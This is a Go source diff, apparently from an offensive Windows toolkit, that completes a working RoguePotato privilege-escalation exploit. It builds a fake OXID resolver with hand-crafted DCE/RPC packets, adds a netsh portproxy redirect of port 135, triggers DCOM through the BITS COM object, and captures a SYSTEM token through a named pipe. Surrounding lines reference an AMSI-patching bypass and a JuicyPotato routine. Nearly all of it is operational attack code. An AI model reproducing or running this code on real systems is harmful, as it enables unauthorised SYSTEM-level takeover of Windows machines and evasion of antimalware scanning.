@@ -3,11 +3,13 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"net"
 	"os/exec"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -25,6 +27,7 @@ var (
 	procImpersonateNamedPipeClient = modadvapi32.NewProc("ImpersonateNamedPipeClient")
 	procCreateProcessWithTokenW    = modadvapi32.NewProc("CreateProcessWithTokenW")
 	procCoInitializeEx             = modole32.NewProc("CoInitializeEx")
+	procCoCreateInstance           = modole32.NewProc("CoCreateInstance")
 )
 
 // patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
@@ -237,12 +240,11 @@ func juicyPotato(command string) error {
 }
 
 // roguePotato redirects OXID resolution to capture a SYSTEM token.
+// The technique requires redirecting port 135 (OXID resolver) traffic to our
+// fake resolver. We handle this automatically via netsh port proxy when the
+// real RPC Endpoint Mapper occupies port 135.
 func roguePotato(command string) error {
 	fmt.Println("[+] RoguePotato: OXID resolver redirection")
-
-	// RoguePotato requires a remote machine or localhost redirect for OXID resolution.
-	// The technique: DCOM activation queries the OXID resolver, we redirect it to our
-	// controlled endpoint which returns a binding string pointing to our named pipe.
 
 	pipeName := `\\.\pipe\rogue_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
 	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)
@@ -259,8 +261,37 @@ func roguePotato(command string) error {
 	defer windows.CloseHandle(pipe)
 	fmt.Printf("[*] Created pipe: %s\n", pipeName)
 
-	// Start fake OXID resolver that redirects to our pipe
-	go startFakeOXIDResolver(pipeName)
+	// Start fake OXID resolver — it returns the listening port via a channel
+	oxidPortCh := make(chan int, 1)
+	go startFakeOXIDResolverWithPort(pipeName, oxidPortCh)
+
+	oxidPort := <-oxidPortCh
+	if oxidPort <= 0 {
+		return fmt.Errorf("fake OXID resolver failed to start")
+	}
+
+	// Set up port proxy if we couldn't bind port 135 directly
+	needsProxy := oxidPort != 135
+	if needsProxy {
+		fmt.Printf("[*] Setting up netsh port proxy: 127.0.0.1:135 → 127.0.0.1:%d\n", oxidPort)
+		proxyCmd := exec.Command("netsh", "interface", "portproxy", "add", "v4tov4",
+			"listenaddress=127.0.0.1", "listenport=135",
+			"connectaddress=127.0.0.1", fmt.Sprintf("connectport=%d", oxidPort))
+		if out, err := proxyCmd.CombinedOutput(); err != nil {
+			fmt.Printf("[!] netsh port proxy failed: %v (%s)\n", err, strings.TrimSpace(string(out)))
+			fmt.Printf("[!] Manual setup required: netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=135 connectaddress=127.0.0.1 connectport=%d\n", oxidPort)
+			// Continue anyway — the operator may have set it up externally
+		} else {
+			fmt.Println("[+] Port proxy established")
+		}
+		defer func() {
+			// Clean up port proxy rule
+			cleanCmd := exec.Command("netsh", "interface", "portproxy", "delete", "v4tov4",
+				"listenaddress=127.0.0.1", "listenport=135")
+			cleanCmd.Run()
+			fmt.Println("[*] Port proxy rule cleaned up")
+		}()
+	}
 
 	// Trigger DCOM activation
 	fmt.Println("[*] Triggering DCOM activation...")
@@ -347,30 +378,319 @@ func triggerCOMAuthentication(pipeName string, port int) {
 	}
 }
 
-// startFakeOXIDResolver starts a listener that responds to OXID resolution requests.
-func startFakeOXIDResolver(pipeName string) {
-	// Listen on port 135 (OXID resolver) or a redirected port
-	ln, err := net.Listen("tcp", "127.0.0.1:0")
+// buildDCERPCHeader builds a DCE/RPC packet header (16 bytes).
+// version 5.0, packet type, flags, data representation (little-endian NDR),
+// fragment length, auth length, call ID.
+func buildDCERPCHeader(pktType byte, fragLen uint16, callID uint32) []byte {
+	hdr := make([]byte, 16)
+	hdr[0] = 5    // version major
+	hdr[1] = 0    // version minor
+	hdr[2] = pktType
+	hdr[3] = 0x03 // flags: first + last fragment
+	// data representation: little-endian, ASCII, IEEE float
+	hdr[4] = 0x10
+	hdr[5] = 0x00
+	hdr[6] = 0x00
+	hdr[7] = 0x00
+	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
+	binary.LittleEndian.PutUint16(hdr[10:12], 0) // auth length
+	binary.LittleEndian.PutUint32(hdr[12:16], callID)
+	return hdr
+}
+
+// buildBindAck constructs a DCE/RPC bind_ack (type 0x0C) response to a bind request.
+func buildBindAck(bindReq []byte) []byte {
+	// Extract call ID from the bind request (offset 12, 4 bytes LE).
+	var callID uint32
+	if len(bindReq) >= 16 {
+		callID = binary.LittleEndian.Uint32(bindReq[12:16])
+	}
+
+	// Secondary address: port string (e.g. "135\0"), length-prefixed uint16.
+	secAddr := []byte("135\x00")
+	secAddrLen := uint16(len(secAddr))
+
+	// Result list: 1 context accepted.
+	// Each result entry: result(2) + reason(2) + transfer_syntax(20)
+	// result=0 (acceptance), reason=0
+	var resultEntry [24]byte // zero-initialized = acceptance
+	// Transfer syntax UUID: NDR 8a885d04-1ceb-11c9-9fe8-08002b104860 v2.0
+	copy(resultEntry[4:20], []byte{
+		0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
+		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
+	})
+	binary.LittleEndian.PutUint32(resultEntry[20:24], 2) // version 2.0
+
+	// Body: max_xmit(2) + max_recv(2) + assoc_group(4) + sec_addr_len(2) + sec_addr + pad + num_results(1) + pad(3) + result_entry(24)
+	body := make([]byte, 0, 128)
+	tmp2 := make([]byte, 2)
+
+	// max_xmit_frag
+	binary.LittleEndian.PutUint16(tmp2, 4280)
+	body = append(body, tmp2...)
+	// max_recv_frag
+	binary.LittleEndian.PutUint16(tmp2, 4280)
+	body = append(body, tmp2...)
+	// assoc_group_id (echo from request, offset 20 in bind)
+	if len(bindReq) >= 24 {
+		body = append(body, bindReq[20:24]...)
+	} else {
+		body = append(body, 0, 0, 0, 0)
+	}
+	// secondary address length + string
+	binary.LittleEndian.PutUint16(tmp2, secAddrLen)
+	body = append(body, tmp2...)
+	body = append(body, secAddr...)
+	// Align to 4 bytes
+	for len(body)%4 != 0 {
+		body = append(body, 0)
+	}
+	// num results
+	body = append(body, 1, 0, 0, 0) // num_results(4 bytes LE, but spec says 1 byte + 3 pad; same layout)
+	body = append(body, resultEntry[:]...)
+
+	fragLen := uint16(16 + len(body))
+	hdr := buildDCERPCHeader(0x0C, fragLen, callID)
+	return append(hdr, body...)
+}
+
+// buildResolveOxid2Response constructs the DCE/RPC response (type 0x02)
+// for a ResolveOxid2 call (opnum 5 on IObjectExporter), encoding the pipe
+// binding string in ppdsaOxidBindings so DCOM connects to our named pipe.
+func buildResolveOxid2Response(request []byte, pipeBinding string) []byte {
+	// Extract call ID from the request header.
+	var callID uint32
+	if len(request) >= 16 {
+		callID = binary.LittleEndian.Uint32(request[12:16])
+	}
+
+	// Build the NDR-encoded stub data for ResolveOxid2 response.
+	// The response contains:
+	//   ppdsaOxidBindings: DUALSTRINGARRAY (ref pointer + wNumEntries + wSecurityOffset + string bindings + null)
+	//   pipAuthnHint: COMAUTHNHINT
+	//   pComVersion: COMVERSION (major, minor)
+	//   HRESULT (status)
+
+	// Encode pipeBinding as a STRINGBINDING entry.
+	// STRINGBINDING: wTowerId(2) + aNetworkAddr(UTF-16LE null-terminated)
+	// wTowerId for ncacn_np = 0x000F
+	bindingUTF16 := utf16Encode(pipeBinding)
+
+	// DUALSTRINGARRAY:
+	//   wNumEntries (uint16): total uint16 elements following (up to but not including wNumEntries itself)
+	//   wSecurityOffset (uint16): offset to security bindings (in uint16 elements from start of aStringArray)
+	//   aStringArray: STRINGBINDING entries terminated by double-null
+
+	// STRINGBINDING: towerId(1 uint16) + addr(N uint16, null-terminated)
+	// Then null terminator for string array, then security bindings (we put none, just null terminator).
+	stringBindingWords := 1 + len(bindingUTF16) + 1 // towerId + addr+null + array terminator null
+	securityOffset := uint16(stringBindingWords)
+	numEntries := uint16(stringBindingWords + 1) // +1 for security array null terminator
+
+	stub := make([]byte, 0, 256)
+
+	// NDR referent pointer for ppdsaOxidBindings
+	stub = appendUint32(stub, 0x00020000)
+	// DUALSTRINGARRAY
+	stub = appendUint16(stub, numEntries)
+	stub = appendUint16(stub, securityOffset)
+
+	// STRINGBINDING: wTowerId = 0x000F (ncacn_np)
+	stub = appendUint16(stub, 0x000F)
+	// aNetworkAddr: UTF-16LE null-terminated
+	for _, c := range bindingUTF16 {
+		stub = appendUint16(stub, c)
+	}
+	stub = appendUint16(stub, 0) // null terminator for this binding string
+
+	// Terminator for string binding array
+	stub = appendUint16(stub, 0)
+
+	// Security bindings: empty, just null terminator
+	stub = appendUint16(stub, 0)
+
+	// Pad stub to 4-byte alignment
+	for len(stub)%4 != 0 {
+		stub = append(stub, 0)
+	}
+
+	// pipAuthnHint (COMAUTHNHINT): referent pointer + value
+	stub = appendUint32(stub, 0x00020004)
+	stub = appendUint32(stub, 0) // no auth hint
+
+	// pComVersion: major=5, minor=7
+	stub = appendUint16(stub, 5)
+	stub = appendUint16(stub, 7)
+
+	// HRESULT = S_OK
+	stub = appendUint32(stub, 0)
+
+	// DCE/RPC response header (type 0x02)
+	// Response header after the 16-byte common header: alloc_hint(4) + context_id(2) + cancel_count(1) + pad(1)
+	respHdr := make([]byte, 8)
+	binary.LittleEndian.PutUint32(respHdr[0:4], uint32(len(stub))) // alloc_hint
+	binary.LittleEndian.PutUint16(respHdr[4:6], 0)                 // context_id
+	respHdr[6] = 0                                                  // cancel_count
+	respHdr[7] = 0                                                  // pad
+
+	fragLen := uint16(16 + len(respHdr) + len(stub))
+	hdr := buildDCERPCHeader(0x02, fragLen, callID)
+
+	pkt := make([]byte, 0, int(fragLen))
+	pkt = append(pkt, hdr...)
+	pkt = append(pkt, respHdr...)
+	pkt = append(pkt, stub...)
+	return pkt
+}
+
+// utf16Encode encodes a Go string to a slice of uint16 code units (no null terminator).
+func utf16Encode(s string) []uint16 {
+	runes := []rune(s)
+	out := make([]uint16, 0, len(runes))
+	for _, r := range runes {
+		if r <= 0xFFFF {
+			out = append(out, uint16(r))
+		} else {
+			r -= 0x10000
+			out = append(out, uint16(0xD800+(r>>10)), uint16(0xDC00+(r&0x3FF)))
+		}
+	}
+	return out
+}
+
+func appendUint16(b []byte, v uint16) []byte {
+	return append(b, byte(v), byte(v>>8))
+}
+
+func appendUint32(b []byte, v uint32) []byte {
+	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
+}
+
+// startFakeOXIDResolverWithPort starts the fake OXID resolver and sends its
+// listening port to the portCh channel. This allows the caller to set up
+// port forwarding if needed.
+func startFakeOXIDResolverWithPort(pipeName string, portCh chan<- int) {
+	// Try port 135 first (where DCOM runtime expects the OXID resolver)
+	ln, err := net.Listen("tcp", "127.0.0.1:135")
 	if err != nil {
-		return
+		// Port 135 in use (normal — the real RPC Endpoint Mapper is running).
+		ln, err = net.Listen("tcp", "127.0.0.1:0")
+		if err != nil {
+			fmt.Printf("[!] OXID resolver: listen failed: %v\n", err)
+			portCh <- -1
+			return
+		}
+		port := ln.Addr().(*net.TCPAddr).Port
+		fmt.Printf("[*] OXID resolver: port 135 in use — listening on port %d\n", port)
+		portCh <- port
+	} else {
+		fmt.Println("[+] OXID resolver: bound to port 135 directly")
+		portCh <- 135
 	}
 	defer ln.Close()
+	fmt.Printf("[*] Fake OXID resolver listening on %s\n", ln.Addr().String())
 
 	conn, err := ln.Accept()
 	if err != nil {
+		fmt.Printf("[!] OXID resolver: accept failed: %v\n", err)
 		return
 	}
 	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(15 * time.Second))
 
-	// Read OXID request and respond with binding string pointing to our pipe
 	buf := make([]byte, 4096)
-	conn.Read(buf)
-	// Response would contain the pipe binding — actual OXID protocol implementation
+
+	// Step 1: Read DCE/RPC bind request (type 0x0B)
+	n, err := conn.Read(buf)
+	if err != nil || n < 16 {
+		fmt.Printf("[!] OXID resolver: failed to read bind request: %v\n", err)
+		return
+	}
+	if buf[2] != 0x0B {
+		fmt.Printf("[!] OXID resolver: expected bind (0x0B), got 0x%02X\n", buf[2])
+		return
+	}
+	fmt.Println("[*] OXID resolver: received DCE/RPC bind request")
+
+	// Step 2: Send bind_ack (type 0x0C)
+	bindAck := buildBindAck(buf[:n])
+	if _, err := conn.Write(bindAck); err != nil {
+		fmt.Printf("[!] OXID resolver: failed to send bind_ack: %v\n", err)
+		return
+	}
+	fmt.Println("[*] OXID resolver: sent bind_ack")
+
+	// Step 3: Read the ResolveOxid2 request (type 0x00, opnum 5)
+	n, err = conn.Read(buf)
+	if err != nil || n < 24 {
+		fmt.Printf("[!] OXID resolver: failed to read ResolveOxid2 request: %v\n", err)
+		return
+	}
+	if buf[2] != 0x00 {
+		fmt.Printf("[!] OXID resolver: expected request (0x00), got 0x%02X\n", buf[2])
+		return
+	}
+	// Opnum is at offset 22 (2 bytes LE) in a DCE/RPC request
+	opnum := binary.LittleEndian.Uint16(buf[22:24])
+	fmt.Printf("[*] OXID resolver: received request opnum=%d\n", opnum)
+
+	// Step 4: Build and send ResolveOxid2 response with our pipe binding
+	hostname, _ := windows.ComputerName()
+	// Convert \\.\pipe\rogue_XXXX to hostname[\pipe\rogue_XXXX]
+	pipeShort := strings.Replace(pipeName, `\\.\pipe\`, `\pipe\`, 1)
+	pipeBinding := fmt.Sprintf("%s[%s]", hostname, pipeShort)
+	fmt.Printf("[*] OXID resolver: responding with binding: ncacn_np:%s\n", pipeBinding)
+
+	response := buildResolveOxid2Response(buf[:n], pipeBinding)
+	if _, err := conn.Write(response); err != nil {
+		fmt.Printf("[!] OXID resolver: failed to send response: %v\n", err)
+		return
+	}
+	fmt.Println("[+] OXID resolver: sent ResolveOxid2 response with pipe redirect")
 }
 
 // triggerDCOMActivation triggers a DCOM activation that queries the OXID resolver.
+// It uses CoCreateInstance with CLSCTX_LOCAL_SERVER to force out-of-process COM
+// activation, which causes the SCM to perform OXID resolution through our fake resolver.
 func triggerDCOMActivation() {
-	// Trigger via COM object instantiation
+	// Initialize COM (COINIT_MULTITHREADED = 0x0)
 	procCoInitializeEx.Call(0, 0)
-	// CoCreateInstance with a CLSID that causes OXID resolution
+
+	// BITS CLSID {4991d34b-80a1-4291-83b6-3328366b9097}
+	// This is a well-known SYSTEM service COM object used in potato attacks.
+	clsid := windows.GUID{
+		Data1: 0x4991d34b,
+		Data2: 0x80a1,
+		Data3: 0x4291,
+		Data4: [8]byte{0x83, 0xb6, 0x33, 0x28, 0x36, 0x6b, 0x90, 0x97},
+	}
+
+	// IUnknown {00000000-0000-0000-C000-000000000046}
+	iidUnknown := windows.GUID{
+		Data1: 0x00000000,
+		Data2: 0x0000,
+		Data3: 0x0000,
+		Data4: [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46},
+	}
+
+	var obj uintptr
+	// CLSCTX_LOCAL_SERVER (0x4) forces out-of-process activation which triggers OXID resolution
+	hr, _, _ := procCoCreateInstance.Call(
+		uintptr(unsafe.Pointer(&clsid)),
+		0,
+		0x4, // CLSCTX_LOCAL_SERVER
+		uintptr(unsafe.Pointer(&iidUnknown)),
+		uintptr(unsafe.Pointer(&obj)),
+	)
+
+	if hr == 0 && obj != 0 {
+		fmt.Println("[+] DCOM activation: COM object instantiated, releasing")
+		// Release via IUnknown::Release (vtable index 2)
+		vtable := *(*[3]uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(obj))))
+		syscall.Syscall(vtable[2], 1, obj, 0, 0)
+	} else {
+		// Failure is expected in many cases — the OXID redirect may have already
+		// captured the token before CoCreateInstance returns.
+		fmt.Printf("[*] DCOM activation: CoCreateInstance returned 0x%08X (expected if token already captured)\n", hr)
+	}
 }
